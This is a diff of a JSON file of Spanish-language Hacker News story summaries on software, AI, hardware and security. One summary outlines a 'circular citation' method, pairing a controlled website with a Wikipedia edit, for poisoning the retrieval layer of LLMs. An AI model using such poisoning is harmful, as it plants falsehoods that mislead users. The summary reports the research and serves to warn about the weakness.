-    "resumen": "HardenedBSD ha iniciado la migración de sus repositorios de código hacia Radicle, una infraestructura descentralizada de colaboración. Se ha implementado una integración básica en el árbol de ports para la descarga de 'distfiles' mediante radicle-httpd. El equipo técnico recomienda ajustar la configuración de Radicle (node.limits.fetchPackReceive) a un mínimo de 3GB para gestionar adecuadamente repositorios de gran escala y planean migrar el 100% de sus proyectos de forma progresiva.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47942437,
-    "url": "https://www.buchodi.com/how-chatgpt-serves-ads-heres-the-full-attribution-loop/",
-    "score": 351,
-    "time": 1777420454,
-    "titulo_es": "Análisis de la arquitectura técnica de la plataforma publicitaria de OpenAI",
-    "resumen": "El artículo describe la implementación técnica del sistema de anuncios en ChatGPT. Detalla cómo el backend inyecta objetos 'single_advertiser_ad_unit' en flujos de eventos del servidor (SSE) y el funcionamiento del SDK de seguimiento 'OAIQ'. Además, analiza el uso de tokens cifrados con Fernet para el rastreo de clics, la estructura de metadatos de los tokens y la gestión de cookies de primera parte para la atribución de conversiones.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47940921,
-    "url": "https://lucumr.pocoo.org/2026/4/28/before-github/",
-    "score": 479,
-    "time": 1777411060,
-    "titulo_es": "El declive de GitHub y la evolución de la infraestructura del código abierto",
-    "resumen": "Análisis histórico y técnico sobre la transición del desarrollo de software de código abierto desde sistemas descentralizados y autogestionados (como Subversion, Trac y SourceForge) hacia la hegemonía de GitHub. El autor examina cómo la centralización facilitó la creación de micro-dependencias y redujo la fricción en la publicación de código, al tiempo que alteró la dinámica de confianza, reputación y responsabilidad técnica que caracterizaba a los proyectos antes de la era de las plataformas sociales de desarrollo.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47935246,
-    "url": "https://github.com/rocky-data/rocky",
-    "score": 61,
-    "time": 1777386959,
-    "titulo_es": "Rocky: Un plano de control basado en Rust para pipelines de almacenamiento de datos",
-    "resumen": "Rocky es una herramienta de infraestructura para ingeniería de datos desarrollada en Rust que actúa como un plano de control para almacenes de datos como Snowflake y Databricks. Se destaca por ofrecer seguridad en tiempo de compilación, gestión de linaje a nivel de columna, manejo de 'schema drift' para evitar corrupción de datos y un sistema de ramificación (branching) para pruebas aisladas. El sistema incluye contratos de datos estrictos, integración con DuckDB para entornos locales y capacidades de generación de modelos DSL mediante lenguaje natural.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47945861,
-    "url": "https://lawvm.org/why-law-is-law-shaped/",
-    "score": 18,
-    "time": 1777453411,
-    "titulo_es": "Por qué esa forma exige un compilador",
-    "resumen": "El artículo analiza la estructura de los sistemas legales desde la perspectiva de la ingeniería de software, comparando la evolución de las leyes con el mantenimiento incremental de bases de código. Propone que, aunque las leyes se organizan como árboles jerárquicos por limitaciones físicas, operan como grafos complejos de dependencias. El autor argumenta la necesidad de un 'compilador de estado legal' que procese operaciones de texto (inserciones, eliminaciones y reemplazos) como un proceso de ejecución reproducible para gestionar correctamente la semántica jurídica y las referencias externas.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47937380,
-    "url": "https://github.com/FeSens/auto-arch-tournament/blob/main/docs/auto-arch-tournament-blog-post.md",
-    "score": 162,
-    "time": 1777396350,
-    "titulo_es": "Bucles de investigación autónomos: Optimizando hardware mediante agentes de IA",
-    "resumen": "El artículo describe un experimento donde un agente de IA autónomo optimizó un núcleo de CPU RV32IM en SystemVerilog, superando los resultados del benchmark humano VexRiscv en un 56% en menos de 10 horas. El autor argumenta que, si bien los bucles de agentes de IA se están convirtiendo en una tecnología genérica (commodity), la verdadera ventaja competitiva y el núcleo de la ingeniería futura radican en la creación de 'verificadores' (verifiers): sistemas encargados de validar rigurosamente las hipótesis producidas por la IA para evitar alucinaciones o errores técnicos en dominios críticos como el diseño de hardware o procesos clínicos.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47939320,
-    "url": "https://stratechery.com/2026/an-interview-with-openai-ceo-sam-altman-and-aws-ceo-matt-garman-about-bedrock-managed-agents/",
-    "score": 276,
-    "time": 1777404283,
-    "titulo_es": "Entrevista de Stratechery: Microsoft, OpenAI y la expansión hacia AWS",
-    "resumen": "Análisis sobre la reestructuración del acuerdo entre Microsoft y OpenAI, marcando el fin de la exclusividad de Azure y la integración de modelos de OpenAI en AWS a través de Bedrock Managed Agents. Se explora el impacto estratégico de esta apertura para competir con Anthropic, la eliminación de la cláusula de AGI hasta 2032 y la evolución de la infraestructura de nube para soportar flujos de trabajo complejos con agentes de IA y hardware especializado como Trainium.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47940389,
-    "url": "https://ron.stoner.com/How_I_Won_a_Championship_That_Doesnt_Exist/",
-    "score": 176,
-    "time": 1777408701,
-    "titulo_es": "Cómo aprendí a envenenar la cadena de suministro de los modelos de lenguaje extenso (LLM)",
-    "resumen": "Análisis técnico sobre ataques de envenenamiento en la capa de recuperación (retrieval layer) de sistemas de IA. El autor demuestra cómo la técnica de 'citación circular' —vincular un sitio web controlado con una edición de Wikipedia— puede engañar a modelos de lenguaje de frontera que utilizan RAG (Generación Aumentada por Recuperación). El artículo subraya una vulnerabilidad crítica en la arquitectura de confianza de la IA: la incapacidad de los modelos para verificar la veracidad de fuentes que aparentan autoridad, permitiendo la inyección de información falsa mediante SEO y manipulación de metadatos externos.",
-    "categoria": "Ciberseguridad"
-  },
-  {
-    "id": 47936479,
-    "url": "https://www.wiz.io/blog/github-rce-vulnerability-cve-2026-3854",
-    "score": 364,
-    "time": 1777392943,
-    "titulo_es": "Detalles sobre CVE-2026-3854: Una falla crítica en la infraestructura interna de git de GitHub que permite RCE",
-    "resumen": "Wiz Research identificó una vulnerabilidad crítica de ejecución remota de comandos (RCE) que afecta a GitHub.com y GitHub Enterprise Server (GHES). El fallo reside en una inyección dentro del protocolo interno de Git de GitHub, permitiendo que un usuario autenticado ejecute comandos arbitrarios en el backend mediante un simple 'git push'. La investigación destaca por el uso de herramientas de ingeniería inversa potenciadas por IA (IDA MCP) para auditar binarios de código cerrado. GitHub ha corregido el error en su plataforma en la nube y recomienda la actualización inmediata de GHES a la versión 3.19.3 o superior.",
-    "categoria": "Ciberseguridad"
-  },
-  {
-    "id": 47920214,
-    "url": "https://discovery.kaust.edu.sa/en/article/26858/gallium-oxide-electronics-withstand-extreme-cold/",
-    "score": 47,
-    "time": 1777289480,
-    "titulo_es": "Semiconductor robusto permite que dispositivos operen cerca del cero absoluto, con aplicaciones potenciales en misiones espaciales y computación cuántica",
-    "resumen": "Investigadores de KAUST han demostrado que los dispositivos basados en óxido de galio beta (β-Ga2O3) pueden funcionar a temperaturas tan bajas como 2 K, superando el fenómeno de 'congelación' de electrones que afecta a los semiconductores convencionales. Mediante el dopaje con silicio, se facilita el flujo de corriente a través de una 'banda de impurezas'. El equipo fabricó con éxito transistores FinFET e inversores lógicos (puertas NOT) funcionales a estas temperaturas, lo que promete simplificar drásticamente el diseño de hardware para computación cuántica y sondas espaciales al eliminar la necesidad de complejos sistemas de gestión térmica.",
-    "categoria": "Hardware"
-  },
-  {
-    "id": 47885644,
-    "url": "https://www.pugetsystems.com/labs/articles/intel-arc-pro-b70-review/",
-    "score": 171,
-    "time": 1777005889,
-    "titulo_es": "Lanzamiento de la Intel Arc Pro B70: Una nueva competidora con 32 GB de VRAM para IA y uso profesional",
-    "resumen": "El artículo analiza el lanzamiento de la Intel Arc Pro B70, una GPU profesional basada en la arquitectura Xe2 (segunda generación). A diferencia de sus competidores que a menudo adaptan diseños existentes, Intel presenta un chip de mayor tamaño que duplica los núcleos Xe y la VRAM respecto al modelo B50, alcanzando los 32 GB con soporte ECC. Con un ancho de banda de memoria de 608 GB/s, un TDP de 230 W y un rendimiento proyectado de 22.94 TFLOPS en FP32, la B70 busca posicionarse competitivamente frente a las ofertas de AMD y NVIDIA en el mercado de estaciones de trabajo orientadas a IA y renderizado profesional.",
-    "categoria": "Hardware"
   },
   {
     "id": 47927903,
     "url": "https://talkie-lm.com/introducing-talkie",
-    "score": 711,
+    "score": 751,
     "time": 1777326948,
-    "titulo_es": "Explorando las capacidades y el conocimiento de los modelos de lenguaje 'vintage'",
-    "resumen": "El artículo describe el desarrollo y la evaluación de modelos de lenguaje (LM) entrenados exclusivamente con textos históricos previos a 1931, denominados modelos 'vintage'. A través del modelo 'talkie-1930-13b-it', los investigadores exploran la capacidad de la IA para predecir eventos futuros, generar descubrimientos científicos post-cutoff y aprender lenguajes de programación modernos como Python sin exposición previa a la computación digital. El objetivo técnico es utilizar estos entornos libres de contaminación de datos para comprender mejor las tendencias de escalado y la generalización en la inteligencia artificial.",
+    "titulo_es": "Modelos de Lenguaje Vintage: Explorando Capacidades del Pasado y Futuro de la IA",
+    "resumen": "Este artículo presenta el concepto y la exploración de 'modelos de lenguaje vintage', que son modelos de IA entrenados exclusivamente con textos históricos anteriores a una fecha de corte específica (pre-1931 en el caso de 'talkie-1930-13b-it'). El objetivo principal es estudiar el comportamiento y las capacidades de estos modelos para avanzar en la comprensión general de la IA, especialmente en áreas como la predicción del futuro y la generación de ideas novedosas. Se evalúa la 'sorprendencia' de eventos históricos para estos modelos, mostrando un aumento después de su conocimiento límite y una meseta posterior. También se investiga su capacidad para descubrir invenciones o descubrimientos científicos que ocurrieron después de su fecha de corte. Un experimento clave es la evaluación de su habilidad para programar en lenguajes modernos (Python) a pesar de no haber sido entrenados con código, demostrando que, aunque con un rendimiento significativamente menor que los modelos modernos, mejoran con la escala, aunque las soluciones generadas son actualmente muy simples. Los modelos vintage se destacan como herramientas valiosas para experimentos de generalización sin contaminación de datos modernos.",
     "categoria": "IA"
   },
   {
-    "id": 47921610,
-    "url": "https://www.quantamagazine.org/a-new-type-of-neuroplasticity-rewires-the-brain-after-a-single-experience-20260424/",
-    "score": 121,
-    "time": 1777298087,
-    "titulo_es": "El cerebro se mantiene increíblemente plástico durante toda nuestra vida",
-    "resumen": "El artículo describe los avances en el campo de la neurociencia respecto a la neuroplasticidad, destacando que el cerebro humano no es estático, sino que se remodela constantemente a través de la experiencia. Se introduce el concepto de 'plasticidad sináptica en escala de tiempo conductual' (BTSP), un mecanismo en el hipocampo que permite la formación de recuerdos inmediatos y el aprendizaje a partir de una sola experiencia mediante señales eléctricas que afectan a múltiples neuronas en un lapso de segundos. Además, se contrasta esta visión moderna con las teorías históricas del siglo XX que consideraban al cerebro adulto como una estructura inmutable.",
-    "categoria": "Ciencia y Matematica"
-  },
-  {
-    "id": 47920599,
-    "url": "https://arstechnica.com/science/2026/04/we-still-dont-have-a-more-precise-value-for-big-g/",
-    "score": 70,
-    "time": 1777292239,
-    "titulo_es": "La persistente búsqueda de la precisión en la constante gravitacional 'G'",
-    "resumen": "El artículo analiza los desafíos históricos y técnicos para medir con exactitud la constante gravitacional universal (G), conocida como 'Big G'. Debido a que la gravedad es la fuerza fundamental más débil, los experimentos de precisión se ven afectados por el ruido gravitatorio terrestre. Se detalla un experimento reciente del NIST que replica un estudio de 2007 utilizando una balanza de torsión sofisticada para intentar resolver discrepancias en los valores obtenidos, aportando nuevos datos a la metrología de precisión sin resolver aún la inconsistencia global.",
-    "categoria": "Ciencia y Matematica"
-  },
-  {
-    "id": 47935853,
-    "url": "https://keepandroidopen.org/en/",
-    "score": 1392,
-    "time": 1777389660,
-    "titulo_es": "Tu teléfono está a punto de dejar de ser tuyo: El fin de la distribución abierta en Android",
-    "resumen": "A partir de septiembre de 2026, Google implementará un sistema obligatorio de registro de desarrolladores que requiere identificación gubernamental para que cualquier aplicación pueda ejecutarse en el ecosistema Android. Esta medida afecta no solo a la Play Store, sino también al 'sideloading' y a tiendas alternativas como F-Droid. Técnicamente, el bloqueo se ejecutará a través de Google Play Services y no del núcleo del SO, obligando a los desarrolladores independientes a validarse centralizadamente ante Google. Aunque existe una vía para usuarios avanzados, esta incluye un periodo de espera de 24 horas y múltiples pasos de disuasión, lo que representa un cambio fundamental en el modelo de confianza y distribución de software de la plataforma.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47936264,
-    "url": "https://www.warp.dev/blog/warp-is-now-open-source",
-    "score": 279,
-    "time": 1777391910,
-    "titulo_es": "Warp se convierte en código abierto y adopta un modelo de desarrollo basado en agentes",
-    "resumen": "Warp ha anunciado que su cliente ahora es de código abierto, introduciendo un paradigma de desarrollo 'agent-first' gestionado por su plataforma de orquestación Oz. Con el respaldo de OpenAI y el uso de modelos GPT, el proyecto busca transformar el ciclo de vida del software permitiendo que agentes de IA realicen la implementación técnica bajo supervisión humana. Este enfoque pretende eliminar cuellos de botella en la creación de código, permitiendo a los contribuyentes enfocarse en el diseño de especificaciones y la verificación de comportamiento en lo que denominan un entorno de desarrollo agentico (ADE).",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47942492,
-    "url": "https://github.com/anthropics/claude-code/issues/49363",
-    "score": 219,
-    "time": 1777420797,
-    "titulo_es": "Problema persistente con recordatorio de seguridad en Claude CLI que causa rechazos de subagentes",
-    "resumen": "El artículo detalla un problema recurrente en la versión 2.1.111 de Claude CLI donde un mensaje de recordatorio de seguridad incrustado en el binario (/Users/.../.local/share/claude/versions/2.1.111) causa que los subagentes rechacen ediciones de código legítimas en proyectos de código abierto. A pesar de que el problema fue supuestamente solucionado en la versión 2.1.92, el recordatorio sigue siendo inyectado en cada resultado de las herramientas Read y Grep (modo contenido). Varios subagentes Opus 4.7 (aproximadamente un 40-60% de tasa de rechazo) citan explícitamente este recordatorio como motivo para negarse a mejorar o aumentar el código, interpretando la instrucción como una prohibición incondicional de modificar archivos leídos, incluso cuando el código es legítimo y el usuario instruye explícitamente lo contrario. La principal discrepancia radica en que el hilo principal interpreta el recordatorio como condicionalmente aplicado al malware, mientras que los subagentes, con menos contexto y mayores restricciones de seguridad, lo aplican literalmente. El autor propone tres soluciones: (a) eliminar el recordatorio ya que el comportamiento de rechazo entrenado de Claude maneja la seguridad contra malware; (b) reformular el recordatorio para que la condición (identificación de malware) preceda a la acción de rechazo, haciendo el alcance incondicional explícito; o (c) limitar la aplicación del recordatorio al primer archivo leído en una conversación en lugar de cada lectura.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47936312,
-    "url": "https://github.com/trycua/cua",
-    "score": 135,
-    "time": 1777392214,
-    "titulo_es": "Agentes de Uso de Computadora de Código Abierto",
-    "resumen": "Este artículo describe una infraestructura de código abierto diseñada para entrenar y evaluar agentes de IA capaces de interactuar con sistemas operativos completos (macOS, Linux, Windows). Permite construir, evaluar y desplegar agentes que pueden 'usar' computadoras de manera autónoma, interactuando con aplicaciones nativas de macOS, y controlando VMs o imágenes de contenedor a través de una API unificada. Se enfoca en la creación de entornos seguros (sandboxes) para estos agentes, el registro de sus interacciones como trayectorias reproducibles, y la provisión de herramientas como CLI, SDKs y benchmarks para su desarrollo y evaluación. Incluye soporte para interacciones multidispositivo (iOS, Android) y la virtualización de VMs en Apple Silicon.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47933208,
-    "url": "https://github.com/localsend/localsend",
-    "score": 855,
-    "time": 1777377260,
-    "titulo_es": "LocalSend: Compartir Archivos de Forma Segura y Local",
-    "resumen": "LocalSend es una aplicación gratuita y de código abierto, multiplataforma, diseñada para el intercambio seguro de archivos y mensajes entre dispositivos cercanos a través de una red local, sin requerir conexión a internet. Utiliza un API REST y cifrado HTTPS para la comunicación, generando certificados TLS/SSL dinámicamente para una seguridad robusta. La aplicación es compatible con varios sistemas operativos y se distribuye a través de tiendas de aplicaciones y gestores de paquetes. Se detalla el soporte para modo portable, inicio oculto y la necesidad de configurar firewalls o deshabilitar el aislamiento AP en routers en caso de problemas de conectividad. El artículo también cubre la compilación desde el código fuente, gestionado con FVM para asegurar la versión correcta de Flutter, y fomenta las contribuciones de la comunidad, incluyendo traducciones y desarrollo. Se mencionan diversas opciones de empaquetado para diferentes distribuciones.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47906651,
-    "url": "https://nullprogram.com/blog/2026/04/26/",
-    "score": 244,
-    "time": 1777169533,
-    "titulo_es": "Transición de Emacs a Aplicaciones Nativas en C++ con wxWidgets",
-    "resumen": "El artículo detalla la transición de un desarrollador de Emacs a aplicaciones nativas de escritorio en C++ después de 20 años de uso. Se enfoca en la reimplementación de dos paquetes de Emacs: una calculadora (stackcalc) y un lector de feeds (Elfeed2). El autor destaca el uso de wxWidgets como toolkit de GUI multiplataforma, elegido por ser más ligero que Qt y ofrecer capacidades de plataforma nativa (I/O, manejo de rutas), a diferencia de Dear ImGui. Menciona que ambos proyectos se compilan fácilmente con CMake y w64devkit. El autor está buscando nuevos mantenedores para estos proyectos que ahora son aplicaciones C++ nativas, destacando la transferencia de la gestión de paquetes a Melpa. La motivación para la reescritura se relaciona con la mejora del rendimiento (uso de GMP/MPFR para la calculadora) y la necesidad de funcionalidades específicas que Emacs no podía satisfacer plenamente o que requerían una modernización.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47933236,
-    "url": "https://github.com/microsoft/VibeVoice",
-    "score": 372,
-    "time": 1777377364,
-    "titulo_es": "VibeVoice: Un Marco de IA de Voz de Vanguardia para Reconocimiento y Síntesis de Habla",
-    "resumen": "VibeVoice es un marco de investigación de IA de voz de código abierto diseñado para avanzar en la colaboración en la comunidad de síntesis de voz. Incluye modelos de Reconocimiento Automático del Habla (ASR) y Síntesis de Voz (TTS) de vanguardia. La innovación central radica en el uso de tokenizadores de voz continuos (acústicos y semánticos) que operan a una frecuencia de fotogramas ultra baja de 7.5 Hz, lo que permite un procesamiento eficiente de secuencias largas. VibeVoice-ASR puede procesar hasta 60 minutos de audio en una sola pasada, generando transcripciones estructuradas (quién, cuándo, qué) con soporte para palabras clave personalizadas, ideal para audio conversacional de formato largo. VibeVoice-TTS, por otro lado, es un modelo de texto a voz de formato largo capaz de sintetizar hasta 90 minutos de habla en una sola pasada, soportando hasta 4 locutores distintos y expresividad multilingüe en varios idiomas. El marco utiliza un enfoque de difusión de siguiente token, aprovechando un Modelo de Lenguaje Grande (LLM) para el contexto y un cabezal de difusión para los detalles acústicos. Si bien inicialmente se lanzó, se eliminó el código TTS debido a usos inconsistentes con la intención declarada, priorizando el uso responsable de la IA.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47939105,
-    "url": "https://dyne.org/cjit/",
-    "score": 127,
-    "time": 1777403414,
-    "titulo_es": "Compilador e Intérprete C Portátil Inspirado en HolyC y Basado en TinyCC",
-    "resumen": "El artículo describe un compilador e intérprete de C pequeño y portátil, con menos de 2MB, que no requiere instalación ni EULA. Inspirado en HolyC y basado en TinyCC, permite escribir y ejecutar aplicaciones C rápidamente utilizando funciones de bibliotecas dinámicas. Está disponible para MS/Windows, Apple/OSX y GNU/Linux.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47901064,
-    "url": "https://worksinprogress.co/issue/the-worlds-most-complex-machine/",
-    "score": 367,
-    "time": 1777121252,
-    "titulo_es": "La Empresa Holandesa que Domina la Fabricación de Semiconductores",
-    "resumen": "El artículo se centra en ASML, una empresa holandesa crucial para la fabricación de semiconductores avanzados. Explica que ASML produce las únicas máquinas en el mundo capaces de estampar miles de millones de transistores microscópicos en chips de silicio utilizando fotolitografía. Detalla cómo esta tecnología, que proyecta patrones con luz, ha evolucionado desde sus inicios hasta la sofisticada litografía ultravioleta extrema (EUV), permitiendo la creación de transistores cada vez más pequeños y densos. Se resalta la importancia de los semiconductores como tecnología fundamental y el monopolio de ASML en la maquinaria de litografía de vanguardia, a pesar de su origen como un actor rezagado que logró el éxito mediante colaboraciones estratégicas y apuestas tecnológicas audaces.",
-    "categoria": "Hardware"
-  },
-  {
-    "id": 47932028,
-    "url": "https://github.blog/changelog/2026-04-27-github-copilot-code-review-will-start-consuming-github-actions-minutes-on-june-1-2026/",
-    "score": 286,
-    "time": 1777366865,
-    "titulo_es": "Actualización de facturación para las revisiones de código de GitHub Copilot",
-    "resumen": "GitHub Copilot está introduciendo cambios en la facturación para sus revisiones de código impulsadas por IA, que se basan en una arquitectura de 'agentic tool-calling' y se ejecutan sobre GitHub Actions. A partir del 1 de junio de 2026, las revisiones de código de Copilot se facturarán en función de los minutos de GitHub Actions consumidos, además de la facturación por PRU de Copilot existente. Esta actualización se aplica a los planes Copilot Business y Copilot Enterprise, incluyendo las revisiones de código realizadas por usuarios no licenciados y facturadas a través de facturación directa de la organización. Hasta la fecha de entrada en vigor, el uso de la revisión de código de Copilot seguirá consumiendo solo la asignación de PRU premium existente y no consumirá minutos de GitHub Actions. Se recomienda a los equipos que revisen su uso de GitHub Actions y consideren la posibilidad de aumentar sus asignaciones de minutos si es necesario. La información adicional sobre estos cambios se puede encontrar en la documentación de GitHub y en la comunidad de GitHub.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47933257,
-    "url": "https://nesbitt.io/2026/04/28/github-actions-is-the-weakest-link.html",
-    "score": 230,
-    "time": 1777377494,
-    "titulo_es": "Vulnerabilidades en GitHub Actions y la Cadena de Suministro del Software de Código Abierto",
-    "resumen": "El artículo analiza cómo las características de GitHub Actions, diseñadas originalmente para CI/CD en repositorios privados, presentan riesgos significativos cuando se utilizan en el ecosistema de código abierto. Se detalla cómo la configuración por defecto, la falta de mecanismos de seguridad robustos como 'lockfiles' o hashes de integridad, y la dependencia de 'tags' mutables en repositorios externos, han sido explotados en incidentes recientes (como Spotbugs, Ultralytics, y tj-actions). Estos ataques, que involucran la ejecución de código malicioso a través de 'pull requests' de forks no confiables (usando el trigger 'pull_request_target'), la manipulación de cachés, y el compromiso de 'Personal Access Tokens' (PATs), han llevado a la fuga de secretos y la distribución de software comprometido. El problema central radica en que la resolución de dependencias de 'actions' (definidas en '.github/workflows' YAML) se realiza contra referencias Git que pueden ser modificadas, permitiendo a atacantes introducir código malicioso que es ejecutado dentro del 'trust boundary' del proyecto afectado.",
-    "categoria": "Ciberseguridad"
-  },
-  {
-    "id": 47934261,
-    "url": "https://www.lumara-space.app/",
-    "score": 200,
-    "time": 1777382748,
-    "titulo_es": "Lumara: Una Aplicación Científica Gratuita para Observación Solar y Lunar",
-    "resumen": "El artículo describe Lumara, una aplicación móvil gratuita para iOS y Android desarrollada por un desarrollador independiente. La aplicación se centra en proporcionar datos científicos detallados sobre el Sol y la Luna, obtenidos directamente de fuentes de la NASA (SDO, SOHO, DONKI) y utilizando algoritmos astronómicos de Jean Meeus. Permite a los usuarios visualizar diferentes longitudes de onda de la actividad solar, seguir eyecciones de masa coronal y tormentas geomagnéticas en tiempo real, y calcular la fase lunar, iluminación, y tiempos de salida/puesta del sol y la luna sin conexión. La aplicación enfatiza la privacidad del usuario, sin cuentas, seguimiento ni anuncios, y toda la funcionalidad está disponible de forma gratuita.",
-    "categoria": "Ciencia y Matematica"
-  },
-  {
-    "id": 47942386,
-    "url": "https://www.anthropic.com/news/claude-for-creative-work",
-    "score": 118,
-    "time": 1777420016,
-    "titulo_es": "Integración de Claude con Herramientas Creativas para Expandir las Capacidades de los Profesionales",
-    "resumen": "El artículo describe la integración del modelo de lenguaje grande Claude con herramientas y software comúnmente utilizados por profesionales creativos, como Blender, Autodesk, Adobe y Ableton. Se presentan \"conectores\" que permiten a Claude interactuar directamente con estas plataformas, facilitando tareas como el análisis y depuración de escenas 3D en Blender, la automatización de scripts y la adición de nuevas funcionalidades a la interfaz de Blender a través de su API de Python. Además, se mencionan colaboraciones con instituciones educativas para integrar estas herramientas en sus currículos de computación creativa. El objetivo es potenciar la creatividad, agilizar procesos y permitir la ejecución de proyectos de mayor escala al delegar tareas repetitivas a la IA y expandir las capacidades de los creativos.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47917250,
-    "url": "https://samizdat.dev/phantom-patch/",
-    "score": 95,
-    "time": 1777258854,
-    "titulo_es": "Inyección de parches en mensajes de commit de GitHub",
-    "resumen": "El artículo describe una vulnerabilidad potencial donde los mensajes de commit en GitHub, al ser exportados como parches (.patch URLs), pueden contener parches falsos incrustados dentro del mensaje. Herramientas comunes como GNU patch, al aplicar estos parches, pueden aplicar incorrectamente tanto el parche real como el falso. Esto se debe a que GNU patch no siempre distingue de forma fiable entre el diff real del commit y un diff ficticio presentado en el mensaje. El autor demuestra un ejemplo donde se crea un archivo adicional (`SHOULD_NOT_BE_HERE.md`) que no formaba parte del commit original. Si bien `git apply` y `git am` son un poco más robustos al rechazar rutas específicas dentro de `.git/hooks`, aún pueden ser susceptibles a parches inyectados para archivos del árbol de trabajo. La implicación es que un atacante podría manipular el contenido aplicado a un repositorio al enviar parches maliciosos de esta manera, afectando la integridad del código. La causa raíz aún está bajo investigación, pudiendo ser un problema en GNU patch, en la exportación de parches de GitHub, o en el formato de parche en sí.",
-    "categoria": "Desarrollo de Software"
-  },
-  {
-    "id": 47939079,
-    "url": "https://chrisnager.com/blog/doom-runs-in-chatgpt-and-claude/",
-    "score": 85,
-    "time": 1777403327,
-    "titulo_es": "DOOM jugable dentro de clientes de IA como ChatGPT y Claude",
-    "resumen": "El artículo describe la creación de una aplicación de DOOM jugable que se integra en clientes de IA compatibles (como Claude y ChatGPT) a través de 'MCP apps' (aplicaciones de interfaz de usuario interactivas que se renderizan dentro de hosts MCP). El diseño prioriza una experiencia dual: una versión integrada en el cliente de IA y una opción de respaldo a través de una URL de navegador. La arquitectura se basa en `cloudflare/doom-wasm` para el runtime de DOOM en el navegador y se complementa con un servidor MCP escrito en TypeScript. Las herramientas `create_doom_session` y `get_doom_launch_url` gestionan la creación de sesiones y la obtención de URLs de lanzamiento firmadas. Un desafío clave fue la compatibilidad entre diferentes clientes de IA con diversas políticas de seguridad (iframes, CSP, restricciones de renderizado). La solución evolucionó de un enfoque de iframe anidado a renderizar directamente el canvas de DOOM dentro del iframe del host MCP, simplificando la integración. El proyecto se desplegó en Netlify, alojando los activos estáticos de DOOM y el servidor MCP bajo el mismo dominio (`chrisnager.com/doom/*`). Se abordaron problemas de depuración relacionados con rutas de contenido y se optimizó el manejo de archivos WAD escribiéndolos directamente en el sistema de archivos Emscripten para mejorar la fiabilidad. El proyecto final se enfoca en ser divertido, técnicamente interesante y usable, eliminando características superfluas para aumentar la estabilidad.",
-    "categoria": "Frontend"
-  },
-  {
-    "id": 47941590,
-    "url": "https://dustri.org/b/carrot-disclosure-forgejo.html",
-    "score": 119,
-    "time": 1777414469,
-    "titulo_es": "Análisis de Seguridad y Divulgación de Vulnerabilidades en Forgejo",
-    "resumen": "El artículo detalla un análisis de seguridad exhaustivo de Forgejo, identificando múltiples vulnerabilidades como SSRF, falta de CSP/Trusted-Types, malas prácticas criptográficas, fallos en mecanismos de autenticación (OAuth2, OTP), DoS, fugas de información y TOCTOU. El autor logró encadenar estas vulnerabilidades para obtener RCE, filtración de secretos y acceso persistente a cuentas. Aunque el RCE principal depende de un registro abierto y una configuración no predeterminada, la gravedad general del código base es preocupante. El autor discute la divulgación de estas fallas, optando por una 'Carrot Disclosure' (divulgación zanahoria) para incentivar una auditoría holística del software, mostrando el impacto de una vulnerabilidad crítica sin revelar todos los detalles técnicos. Se menciona la dificultad de contactar a los moderadores en redes sociales.",
-    "categoria": "Ciberseguridad"
-  },
-  {
-    "id": 47938184,
-    "url": "https://waymo.com/blog/shorts/waymo-in-portland/",
-    "score": 276,
-    "time": 1777399693,
-    "titulo_es": "Waymo llega a Portland",
-    "resumen": "El artículo anuncia la expansión de Waymo, una empresa de vehículos autónomos, a Portland, Oregón. Waymo está trabajando con funcionarios de la ciudad y socios comunitarios para establecer un marco regulatorio para el despliegue de su tecnología. Las operaciones iniciales implicarán la conducción manual de vehículos para familiarizar al \"Waymo Driver\" con las características de las calles de Portland. El objetivo es proporcionar una opción de transporte segura, confiable y sin estrés, contribuyendo a los objetivos de Visión Cero de la ciudad para eliminar las muertes en el tráfico. Se destacan las reducciones en accidentes graves reportadas en otras ciudades donde opera Waymo y la sinergia con organizaciones como MADD (Madres Contra la Conducción Ebria) para prevenir la conducción bajo los efectos del alcohol.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47942903,
-    "url": "https://www.mendral.com/blog/frontier-model-lower-costs",
-    "score": 88,
-    "time": 1777424232,
-    "titulo_es": "Arquitectura de Agentes LLM para Triaje y Depuración de Logs de CI",
-    "resumen": "El artículo detalla una arquitectura de agentes de IA para procesar terabytes de logs de CI, centrándose en la optimización de costos y la eficiencia. La estrategia principal implica un patrón de 'triaje' utilizando un modelo LLM más económico (Haiku) para identificar y descartar fallos duplicados o conocidos. Solo los fallos no identificados como duplicados se escalan a un modelo más potente y costoso (Opus) para una investigación profunda. Para manejar logs extensos (200K+ líneas), los agentes no procesan los logs completos directamente en el prompt, sino que interactúan con una base de datos (ClickHouse) a través de SQL, utilizando vistas materializadas y logs crudos según sea necesario. El sistema guía al agente progresivamente con la información de las consultas. Opus genera hipótesis y delega tareas de investigación específicas a sub-agentes Haiku, limitando la profundidad de la recursión para controlar los costos. Esta arquitectura reduce significativamente la carga sobre los modelos de alto rendimiento, logrando que el 80% de los fallos nunca lleguen a Opus y que el costo de un triaje exitoso sea 25 veces menor que una investigación completa.",
-    "categoria": "IA"
-  },
-  {
-    "id": 47922482,
-    "url": "https://www.johndcook.com/blog/2026/04/24/nonlinear-pendulum/",
-    "score": 33,
-    "time": 1777301781,
-    "titulo_es": "La física y las matemáticas del péndulo no lineal",
